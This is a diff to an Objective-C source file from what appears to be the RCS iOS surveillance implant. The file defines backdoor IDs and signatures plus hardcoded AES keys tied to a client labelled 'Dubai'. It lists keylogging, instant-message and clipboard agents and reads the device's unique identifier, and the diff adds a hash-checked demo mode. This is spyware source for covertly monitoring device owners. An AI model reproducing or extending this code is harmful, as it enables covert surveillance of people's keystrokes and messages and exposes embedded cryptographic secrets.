@@ -9,10 +9,12 @@
  */
 #import <Foundation/Foundation.h>
 #import <CoreFoundation/CoreFoundation.h>
+#import <AudioToolbox/AudioToolbox.h>
 #import <CommonCrypto/CommonDigest.h>
 #import <UIKit/UIDevice.h>
 #import <sqlite3.h>
 
+#import "NSData+SHA1.h"
 #import "NSMutableData+AES128.h"
 #import "RCSIEncryption.h"
 #import "RCSICommon.h"
@@ -33,7 +35,7 @@ char  gLogAesKey[]      = "9797DE1BD45444B171B9D6CCE6E0CB45"; // 11 Dubai
 #ifndef DEV_MODE
 char  gConfAesKey[]     = "Adf5V57gQtyi90wUhpb8Neg56756j87R"; // default
 #else
-char  gConfAesKey[]     = "2A61DC73B553402F804FB0D0036C632F"; // 11 Dubai
+char  gConfAesKey[]     = "2A61DC73B553402F804FB0D0036C632F"; //
 #endif
 
 // Instance ID (20 bytes) unique per backdoor/user
@@ -50,12 +52,17 @@ char gBackdoorID[]      = "RCS_0000000011"; // 11 Dubai
 #ifndef DEV_MODE
 char gBackdoorSignature[]       = "f7Hk0f5usd04apdvqw13F5ed25soV5eD"; //default
 #else
-char gBackdoorSignature[]       = "MPMxXyD6fUfaWaIOia4X+koq7BtXXj3o"; // Dubai
+char gBackdoorSignature[]       = "MPMxXyD6fUfaWaIOia4X+koq7BtXXj3o"; 
 #endif
+
+// Demo marker: se la stringa e' uguale a "hxVtdxJ/Z8LvK3ULSnKRUmLE"
+// allora e' in demo altrimenti no demo.
+char gDemoMarker[] = "hxVtdxJ/Z8LvK3ULSnKRUmLE";
 
 // Configuration Filename encrypted within the first byte of gBackdoorSignature
 char gConfName[]    = "c3mdX053du1YJ541vqWILrc4Ff71pViL";
 
+BOOL gIsDemoMode    = FALSE;
 BOOL gAgentCrisis   = NO;
 BOOL gCameraActive  = NO;
 
@@ -81,7 +88,7 @@ u_int remoteAgents[8] = { OFFT_KEYLOG,
                           OFFT_IM,
                           OFFT_CLIPBOARD };
 
-u_int gVersion      = 2012013102;
+u_int gVersion      = 2012041601;
 
 int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
 {
@@ -92,11 +99,11 @@ int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
   size_t          length;
   
   // a valid pointer procList holder should be passed
-  assert(procList != NULL);
+  //assert(procList != NULL);
   // But it should not be pre-allocated
-  assert (*procList == NULL);
+  //assert (*procList == NULL);
   // a valid pointer to procCount should be passed
-  assert (procCount != NULL);
+  //assert (procCount != NULL);
   
   *procCount = 0;
   
@@ -105,7 +112,7 @@ int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
   
   do
     {
-      assert (result == NULL);
+      //assert (result == NULL);
       
       // Call sysctl with a NULL buffer to get proper length
       length = 0;
@@ -131,7 +138,7 @@ int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
             done = true;
           else if (err == ENOMEM)
             {
-              assert (result != NULL);
+              //assert (result != NULL);
               free(result);
               result = NULL;
               err = 0;
@@ -151,7 +158,7 @@ int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
   if (err == 0)
     *procCount = length / sizeof (kinfo_proc);
   
-  assert ((err == 0) == (*procList != NULL ));
+  //assert ((err == 0) == (*procList != NULL ));
   
   return err;
 }  
@@ -307,8 +314,8 @@ NSString *getHostname ()
 //
 NSString *getSystemSerialNumber()
 {
+
   NSString *id = [[UIDevice currentDevice] uniqueIdentifier];
-  
   return id;
 }
 
@@ -936,4 +943,31 @@ rcs_sqlite_do_select(sqlite3 *db, const char *stmt)
     return nil;
 
   return [results autorelease];
+}
+
+void checkAndRunDemoMode()
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  // precalc sha1 of "hxVtdxJ/Z8LvK3ULSnKRUmLE
+  char demoSha1[] = "\x31\xa2\x85\xaf\xb0\x43\xe7\xa0\x90\x49"
+                    "\x94\xe1\x70\x07\xc8\x26\x3d\x45\x42\x73";
+  
+  NSMutableData *isDemoMarker = [[NSMutableData alloc] initWithBytes: demoSha1 length: 20];
+  
+  NSData *demoMode      = [[NSData alloc] initWithBytes: gDemoMarker length: 24];
+  
+  NSData *currDemoMode  = [demoMode sha1Hash];
+  
+  if ([currDemoMode isEqualToData: isDemoMarker] == TRUE) 
+    {
+      gIsDemoMode = YES;
+      AudioServicesPlaySystemSound(1304);
+      AudioServicesPlaySystemSound(kSystemSoundID_Vibrate);
+      AudioServicesPlaySystemSound(kSystemSoundID_Vibrate);
+    }    
+  
+  [demoMode release];
+  [isDemoMarker release];
+  [pool release];
 }
